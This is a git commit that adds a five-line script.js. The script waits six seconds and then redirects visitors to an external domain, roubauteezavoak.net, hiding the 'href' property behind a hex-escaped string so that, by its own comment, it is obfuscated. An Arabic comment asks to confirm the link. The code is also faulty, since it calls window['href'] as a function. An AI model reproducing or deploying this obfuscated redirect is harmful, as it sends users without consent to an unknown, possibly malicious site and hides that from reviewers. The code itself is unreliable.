d289fba681854e7362bbce97c6d9923aebe10c78
GamePlaywin <benbenhibahiba@gmail.com>
2025-03-03 19:10:19 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,5 @@
+// Redirect to another page after 6 seconds (Obfuscated)
+var _0xabc1 = ["\x68\x72\x65\x66"];
+setTimeout(function() {
+    window[_0xabc1[0]]("https://roubauteezavoak.net/4/9011282"); // تأكد من أن الرابط صحيح
+}, 6000);
